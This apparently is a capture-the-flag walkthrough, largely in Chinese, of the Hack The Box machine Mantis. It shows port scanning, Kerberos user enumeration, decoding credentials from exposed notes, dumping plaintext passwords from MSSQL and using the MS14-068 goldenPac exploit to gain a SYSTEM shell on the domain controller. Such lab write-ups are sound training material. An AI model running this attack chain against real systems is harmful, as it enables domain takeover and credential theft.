kali 10.10.16.5

Mantis 



```bash
nmap -p- --min-rate 4444 10.10.10.52
```

```bash
└─# nmap -p53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,10475,26347,49152,49153,49154,49155,49157,49158,49164,49165,49171,50255 -sC -sV -oN nmap.txt  10.10.10.52
```

```
PORT      STATE  SERVICE      VERSION
53/tcp    open   domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-20 07:19:14Z)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
1337/tcp  open   http         Microsoft IIS httpd 7.5
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
1433/tcp  open   ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-info: 
|   10.10.10.52:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-09-20T07:16:19
|_Not valid after:  2053-09-20T07:16:19
|_ssl-date: 2023-09-20T07:21:03+00:00; -1s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.10.52:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5722/tcp  open   msrpc        Microsoft Windows RPC
8080/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Tossed Salad - Blog
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Microsoft-IIS/7.5
9389/tcp  open   mc-nmf       .NET Message Framing
10475/tcp closed unknown
26347/tcp closed unknown
49152/tcp open   msrpc        Microsoft Windows RPC
49153/tcp open   msrpc        Microsoft Windows RPC
49154/tcp open   msrpc        Microsoft Windows RPC
49155/tcp open   msrpc        Microsoft Windows RPC
49157/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open   msrpc        Microsoft Windows RPC
49164/tcp open   msrpc        Microsoft Windows RPC
49165/tcp closed unknown
49171/tcp closed unknown
50255/tcp open   ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-info: 
|   10.10.10.52:50255: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 50255
|_ssl-date: 2023-09-20T07:21:03+00:00; -1s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.10.52:50255: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-09-20T07:16:19
|_Not valid after:  2053-09-20T07:16:19
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 34m16s, deviation: 1h30m45s, median: -1s
| smb2-time: 
|   date: 2023-09-20T07:20:35
|_  start_date: 2023-09-20T07:16:12
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2023-09-20T03:20:36-04:00
```



```bash
echo '10.10.10.52 htb.local mantis.htb.local' >> /etc/hosts
```



# 445 SMB

```bash
└─# smbmap -H 10.10.10.52
[+] IP: 10.10.10.52:445	Name: 10.10.10.52   
```

```bash
─# smbclient -N -L //10.10.10.52
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.52 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

啥也没有



# 445 RPC

```bash
└─# rpcclient -U '' -N 10.10.10.52
rpcclient $> querydispinfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

无



# 88 Kerberos

用户名枚举

```bash
└─# ../Desktop/kerbrute_linux_amd64 userenum --domain htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.52
```

得到三个用户名，把它们做成字典

```bash
└─# cat user.list                                                                                                                               
administrator
james
mantis
```



接著查看一下有无不需要进行预身份验证的用户

```bash
└─# for user in $(cat user.list); do GetNPUsers.py htb.local/${user} -no-pass -dc-ip 10.10.10.52 2>/dev/null | grep -F -e '[+]' -e '[-]'; done              130 ⨯
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mantis doesn't have UF_DONT_REQUIRE_PREAUTH set
```

结果无



# 8080 Website

一个博客

<img src=".\图片\Snipaste_2023-09-20_15-54-09.png" alt="Snipaste_2023-09-20_15-54-09" style="zoom:80%;" />

知道了 cms ，可尝试利用

```bash
└─# searchsploit Orchard
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Orchard 1.3.9 - 'ReturnUrl' Open Redirection                                                                                    | php/webapps/36493.txt
Orchard CMS 1.7.3/1.8.2/1.9.0 - Persistent Cross-Site Scripting                                                                 | asp/webapps/37533.txt
Orchard Core RC1 - Persistent Cross-Site Scripting                                                                              | aspx/webapps/48456.txt
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

先放放



# 1337 Website

一个 IIS 站点

目录扫描

```bash
gobuster dir -u http://10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 
```

得到目录 `/secure_notes/`

<img src=".\图片\Snipaste_2023-09-20_15-58-09.png" alt="Snipaste_2023-09-20_15-58-09" style="zoom:80%;" />

依次查看信息

dev_notes....：

<img src=".\图片\Snipaste_2023-09-20_15-58-54.png" alt="Snipaste_2023-09-20_15-58-54" style="zoom:80%;" />

```

Credentials stored in secure format
OrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001
SQL Server sa credentials file namez
```

webconfig：

<img src=".\图片\Snipaste_2023-09-20_15-59-23.png" alt="Snipaste_2023-09-20_15-59-23" style="zoom:80%;" />



对重要信息解密，不会的话谷歌搜

<img src=".\图片\Snipaste_2023-09-20_16-02-59.png" alt="Snipaste_2023-09-20_16-02-59" style="zoom:80%;" />

得到一组密码：`@dm!n_P@ssW0rd!`

也可以使用脚本：

```bash
└─# perl -lpe '$_=pack"B*",$_' < <( echo 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001 )
@dm!n_P@ssW0rd!
```



继续解密 `secure_notes/dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt`，看文件名就很 base64

```bash
└─# echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d
6d2424716c5f53405f504073735730726421      
```

All of the two digit hex values seem to fall into the ASCII range, so I’ll give that a try with `xxd`, and it works:

```bash
root@kali# echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -r -p
m$$ql_S@_P@ssW0rd!
```



现在有两组密码了

```
m$$ql_S@_P@ssW0rd!
@dm!n_P@ssW0rd!
```



# 1433 MSSQL

尝试登录

```bash
mssqlclient.py 'admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'
mssqlclient.py 'sa:m$$ql_S@_P@ssW0rd!@10.10.10.52'
```

用 admin 用户名的成功了

```bash
└─# mssqlclient.py 'admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```

用 GUI 工具更方便 dbeaver(kali可安装)。这里环境有问题，于是手动查询  [SQL Server中获取所有数据库名、所有表名、所有字段名的SQL语句_lingxyd_0的博客-CSDN博客](https://blog.csdn.net/lingxyd_0/article/details/18356407)

```
SELECT name, database_id, create_date  FROM sys.databases;
```

```
use master;
```

```
use orcharddb
```

```
Select Name FROM SysObjects Where XType='U' orDER BY Name
```

```
select * from blog_Orchard_Users_UserPartRecord 
```

结果很乱：

```
         Id   UserName                                                                                                                                                                                                                                                          Email                                                                                                                                                                                                                                                             NormalizedUserName                                                                                                                                                                                                                                                Password                                                                                                                                                                                                                                                          PasswordFormat                                                                                                                                                                                                                                                    HashAlgorithm                                                                                                                                                                                                                                                     PasswordSalt                                                                                                                                                                                                                                                      RegistrationStatus                                                                                                                                                                                                                                                EmailStatus                                                                                                                                                                                                                                                       EmailChallengeToken                                                                                                                                                                                                                                               CreatedUtc            LastLoginUtc          LastLogoutUtc         

-----------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -------------------   -------------------   -------------------   

          2   admin                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               admin                                                                                                                                                                                                                                                             AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==                                                                                                                                                                                              Hashed                                                                                                                                                                                                                                                            PBKDF2                                                                                                                                                                                                                                                            UBwWF1CQCsaGc/P7jIR/kg==                                                                                                                                                                                                                                          Approved                                                                                                                                                                                                                                                          Approved                                                                                                                                                                                                                                                          NULL                                                                                                                                                                                                                                                              2017-09-01 13:44:01   2017-09-01 14:03:50   2017-09-01 14:06:31   

         15   James                                                                                                                                                                                                                                                             james@htb.local                                                                                                                                                                                                                                                   james                                                                                                                                                                                                                                                             J@m3s_P@ssW0rd!                                                                                                                                                                                                                                                   Plaintext                                                                                                                                                                                                                                                         Plaintext                                                                                                                                                                                                                                                         NA                                                                                                                                                                                                                                                                Approved                                                                                                                                                                                                                                                          Approved                                                                                                                                                                                                                                                          NULL                                                                                                                                                                                                                                                              2017-09-01 13:45:44   NULL                  NULL                  
```

大致得到一组密码凭据

```
james:J@m3s_P@ssW0rd!
```



# Recon as James

## smb 445

```bash
└─# crackmapexec smb 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'
[*] Initializing FTP protocol database
SMB         10.10.10.52     445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.52     445    MANTIS           [+] htb.local\james:J@m3s_P@ssW0rd! 
```

```bash
└─# smbmap -H 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'
[+] IP: 10.10.10.52:445	Name: 10.10.10.52                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
```



## 445 rpc

```bash
└─# rpcclient -U htb.local/james 10.10.10.52
Password for [HTB.LOCAL\james]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[james] rid:[0x44f]
```



## Kerberos

查询不需要进行域身份验证的用户

```bash
GetNPUsers.py 'htb.local/james:J@m3s_P@ssW0rd!' -dc-ip 10.10.10.52
```

无



# Shell as System



无脑 ms14068，黄金票据

```bash
└─# goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52  htb.local/james@mantis.htb.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller 10.10.10.52
[*] 10.10.10.52 found vulnerable!
[*] Requesting shares on 10.10.10.52.....
[*] Found writable share ADMIN$
[*] Uploading file cqEKsISL.exe
[*] Opening SVCManager on 10.10.10.52.....
[*] Creating service kGqS on 10.10.10.52.....
[*] Starting service kGqS.....
[!] Press help for extra shell commands                                                                                                                          Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami                                                                                                                                       nt authority\system
```

​                                                              

```
type c:\Users\Administrator\Desktop\root.txt
```

```
type c:\Users\james\Desktop\user.txt
```



```
3eb74cc94b3041ae2b2247a6b7e521c
```

```
3690910754c7ffe9c8c7ae9a7f2ada5
```

```
241d56851a0ebf60302121e7bb203e14
```

flag少一位，少在开头，burp 爆破



[AD-Mantis - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/351497.html)

[HTB: Mantis | 0xdf hacks stuff](https://0xdf.gitlab.io/2020/09/03/htb-mantis.html#forge-golden-ticket)
